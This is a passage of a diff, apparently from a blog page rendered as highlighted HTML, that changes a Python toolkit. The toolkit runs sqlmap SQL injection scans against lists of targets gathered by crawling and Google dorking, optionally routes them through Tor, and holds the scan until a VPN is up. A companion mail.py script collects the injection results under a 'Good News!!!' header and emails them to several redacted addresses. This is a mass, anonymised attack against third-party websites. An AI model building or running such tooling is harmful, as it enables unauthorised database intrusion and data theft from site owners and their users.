-			<span class="n">mysqlmap</span><span class="o">.</span><span class="n">sqlmap_craw</span><span class="p">(</span><span class="s">"targets.txt"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">)</span>
+			<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
+				<span class="k">if</span> <span class="n">checkvpn</span><span class="p">():</span>
+					<span class="n">mysqlmap</span><span class="o">.</span><span class="n">sqlmap_craw</span><span class="p">(</span><span class="s">"targets.txt"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">)</span>
+				<span class="k">else</span><span class="p">:</span>
+					<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+					<span class="k">print</span><span class="p">(</span><span class="s">"vpn is off,scan will continue till vpn is on"</span><span class="p">)</span>
+
+
 		<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">2</span><span class="p">:</span>
-			<span class="n">mysqlmap</span><span class="o">.</span><span class="n">sqlmap_g_nohuman</span><span class="p">(</span><span class="s">"targets.txt"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">)</span>
+			<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
+				<span class="k">if</span> <span class="n">checkvpn</span><span class="p">():</span>
+					<span class="n">mysqlmap</span><span class="o">.</span><span class="n">sqlmap_g_nohuman</span><span class="p">(</span><span class="s">"targets.txt"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">)</span>
+				<span class="k">else</span><span class="p">:</span>
+					<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+					<span class="k">print</span><span class="p">(</span><span class="s">"vpn is off,scan will continue till vpn is on"</span><span class="p">)</span>
+			
 		<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">3</span><span class="p">:</span>
-			<span class="n">mysqlmap</span><span class="o">.</span><span class="n">sqlmap_g_human</span><span class="p">(</span><span class="s">"targets.txt"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">)</span>
+			<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
+				<span class="k">if</span> <span class="n">checkvpn</span><span class="p">():</span>
+					<span class="n">mysqlmap</span><span class="o">.</span><span class="n">sqlmap_g_human</span><span class="p">(</span><span class="s">"targets.txt"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">)</span>
+				<span class="k">else</span><span class="p">:</span>
+					<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+					<span class="k">print</span><span class="p">(</span><span class="s">"vpn is off,scan will continue till vpn is on"</span><span class="p">)</span>
+			
 		<span class="k">elif</span> <span class="n">num</span><span class="o">!=</span><span class="mi">1</span> <span class="ow">and</span> <span class="n">num</span><span class="o">!=</span><span class="mi">2</span> <span class="ow">and</span> <span class="n">num</span><span class="o">!=</span><span class="mi">3</span><span class="p">:</span>
 			<span class="k">print</span><span class="p">(</span><span class="s">"choose number wrong"</span><span class="p">)</span>
 
-
-		<span class="k">pass</span>
 	<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'/usr/bin/python2.7 mail.py'</span><span class="p">)</span>
-	<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'''mv -f ~/.sqlmap/output_bak/* ~/.sqlmap/output'''</span><span class="p">)</span>
+	<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'''mv -f /root/.sqlmap/output_bak/* /root/.sqlmap/output'''</span><span class="p">)</span>
 </code></pre>
 </div>
 
 <p>6&gt;mail.py</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code><span class="c"># -*- coding: utf-8 -*-</span>
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="c"># -*- coding: utf-8 -*-</span>
+<span class="c"># make sure your MyToolKit folder has only target file,and make its</span>
+<span class="c"># ext 'targets.txt',otherwise you should change the source code to make it </span>
+<span class="c"># good to use.</span>
+<span class="c"># </span>
+<span class="c"># #/root/myenv2/bin/python3.5m is the normal python3</span>
+<span class="c">#/root/myenv/bin/python3.5 is the changed GoogleScraper script version python</span>
+<span class="c">#</span>
+<span class="c"># -*- coding: utf-8 -*-</span>
 <span class="c"># make sure your MyToolKit folder has only target file,and make its</span>
 <span class="c"># ext 'targets.txt',otherwise you should change the source code to make it </span>
 <span class="c"># good to use.</span>
@@ -1254,10 +1426,10 @@ input your number here:'''</span><span class="p">,</span><span class="n">end</sp
 <span class="k">def</span> <span class="nf">sendMail</span><span class="p">(</span><span class="n">mailto</span><span class="p">,</span><span class="n">subject</span><span class="p">,</span><span class="n">body</span><span class="p">,</span><span class="n">format</span><span class="o">=</span><span class="s">'plain'</span><span class="p">):</span>
 
     <span class="c">#host,user,password,fromMail = smtpInfo</span>
-    <span class="n">host</span><span class="o">=</span><span class="s">'smtp.163.com'</span>
-    <span class="n">user</span><span class="o">=</span><span class="s">'xxxxxxxxxxx@163.com'</span>
-    <span class="n">password</span><span class="o">=</span><span class="s">'xxxxxxxxx'</span>
-    <span class="n">fromMail</span><span class="o">=</span><span class="s">'xxxxxxxxxxxxx'</span>
+    <span class="n">host</span><span class="o">=</span><span class="s">'xxxxxxxxxx'</span>
+    <span class="n">user</span><span class="o">=</span><span class="s">'xxxxxxxxxx'</span>
+    <span class="n">password</span><span class="o">=</span><span class="s">'xxxxxxxxxx'</span>
+    <span class="n">fromMail</span><span class="o">=</span><span class="s">'xxxxxxxxxx'</span>
 
     <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">body</span><span class="p">,</span><span class="nb">unicode</span><span class="p">)</span> <span class="ow">is</span> <span class="bp">True</span><span class="p">:</span>
         <span class="n">body</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>
@@ -1366,7 +1538,7 @@ input your number here:'''</span><span class="p">,</span><span class="n">end</sp
 		
 
 <span class="k">def</span> <span class="nf">get_msg_to_send</span><span class="p">():</span>
-	<span class="n">msg_list</span><span class="o">=</span><span class="n">get_result_from_folder</span><span class="p">(</span><span class="s">"~/.sqlmap/output"</span><span class="p">)</span>                
+	<span class="n">msg_list</span><span class="o">=</span><span class="n">get_result_from_folder</span><span class="p">(</span><span class="s">"/root/.sqlmap/output"</span><span class="p">)</span>                
 	<span class="n">msg_to_send</span><span class="o">=</span><span class="s">"Good News!!! below are the results of sqli output:</span><span class="se">\r\n</span><span class="s">-----------------------------------------------------------------------------</span><span class="se">\r\n</span><span class="s">"</span>
 	<span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="n">msg_list</span><span class="p">:</span>
 		<span class="k">for</span> <span class="n">one</span> <span class="ow">in</span> <span class="n">each</span><span class="p">:</span>
@@ -1380,9 +1552,9 @@ input your number here:'''</span><span class="p">,</span><span class="n">end</sp
 <span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
 	<span class="n">msg</span><span class="o">=</span><span class="n">get_msg_to_send</span><span class="p">()</span>
 	<span class="k">print</span> <span class="mi">66666666666666666666666666666666666</span>
-	<span class="n">sendMail</span><span class="p">(</span><span class="s">'xxxxxxxxxxx@qq.com'</span><span class="p">,</span><span class="s">'annoymous'</span><span class="p">,</span><span class="n">msg</span><span class="p">)</span>
-	<span class="n">sendMail</span><span class="p">(</span><span class="s">'xxxxxxxxxxxxxxxx@qq.com'</span><span class="p">,</span><span class="s">'annoymous'</span><span class="p">,</span><span class="n">msg</span><span class="p">)</span>
-	<span class="n">sendMail</span><span class="p">(</span><span class="s">'xxxxxxxxxxxxxxxxxxxx@163.com'</span><span class="p">,</span><span class="s">'annoymous'</span><span class="p">,</span><span class="n">msg</span><span class="p">)</span>
+	<span class="n">sendMail</span><span class="p">(</span><span class="s">'xxxxxxxxxx'</span><span class="p">,</span><span class="s">'xxxxxxxxxx'</span><span class="p">,</span><span class="n">msg</span><span class="p">)</span>
+	<span class="n">sendMail</span><span class="p">(</span><span class="s">'xxxxxxxxxx'</span><span class="p">,</span><span class="s">'xxxxxxxxxx'</span><span class="p">,</span><span class="n">msg</span><span class="p">)</span>
+	<span class="n">sendMail</span><span class="p">(</span><span class="s">'xxxxxxxxxx'</span><span class="p">,</span><span class="s">'xxxxxxxxxx'</span><span class="p">,</span><span class="n">msg</span><span class="p">)</span>
 
 
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
